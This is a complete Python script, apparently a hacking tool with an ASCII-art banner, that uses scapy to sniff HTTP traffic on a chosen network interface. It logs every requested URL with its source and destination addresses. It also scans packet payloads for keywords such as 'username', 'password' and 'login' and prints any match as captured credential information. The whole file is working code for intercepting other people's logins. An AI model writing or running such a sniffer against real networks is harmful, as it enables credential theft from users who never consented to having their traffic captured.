import scapy.all                            as scapy
from scapy.layers                           import http
from argparse                               import ArgumentParser
from colorama                               import Fore, init
from os                                     import system
from sys                                    import stdout

init()

def title():
    system('clear || cls')
    stdout.write(f'{Fore.LIGHTWHITE_EX}         ▄▄▄▄▄▄▄▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}        ▄████████████\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}      ▄██   ████▀▀████\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}  ▐▄ ▐███▄ ▄███▌   ███▌▄██\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}   █▌████████████▄███████▌ {Fore.LIGHTCYAN_EX}  ▄█████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}   █████████ ▐██████████▀  {Fore.LIGHTCYAN_EX}▄█████████████▌\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}     ██████████████████    {Fore.LIGHTCYAN_EX}█████████▀████\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}      ████████████████    {Fore.LIGHTCYAN_EX} ███████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}       ▀██████████████     {Fore.LIGHTCYAN_EX} ▀████████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}         ▀█████████████▄  {Fore.LIGHTCYAN_EX}  ▄▄ ▀▀█████████ ███  █▌ █▌ ▐█▀▀  █▀▀▀ ██▀▀  █▀▀█▌\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}            ▀▀▀██████████ {Fore.LIGHTCYAN_EX} ███████████████ █▌ █▄█▌ █▌ ▐█▀▀  █▀▀▀ ██▀▀  █▀██\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}                          {Fore.LIGHTCYAN_EX}▀██████████████▀ █▌  ██▌ █▌ ▐█    █    ██▄▄  █  ▀▌\n\n')
    
def get_args():
    parser = ArgumentParser()
    parser.add_argument('-i', '--interface', dest = 'interface', help = 'Interface Name (ex:.. Wi-Fi, etc...)')
    options = parser.parse_args()
    if not options.interface:
        parser.error('Please specify the name of the interface, use --help for more info.')
    return options.interface
  
def sniffer(interface):
    print(f'{Fore.LIGHTCYAN_EX}[NETWORK]{Fore.LIGHTWHITE_EX} Sniffing in progress. . .')
    scapy.sniff(iface = interface, store = False, prn = process_packet)
    
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        print(f'{Fore.LIGHTWHITE_EX}[HTTP] \033[47m\033[30m Requests/URL Requested  {url} \033[46m\033[30m  {ip_src}  \033[44m\033[30m  {ip_dst}  \033[0m')
        cred = get_credentials(packet)
        if cred:
            print(f'{Fore.LIGHTWHITE_EX}[HTTP] \033[41m\033[30m Possible Credential Information : {cred} \033[47m\033[30m {url} \033[0m')

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load

title()
interface = get_args()
sniffer(interface)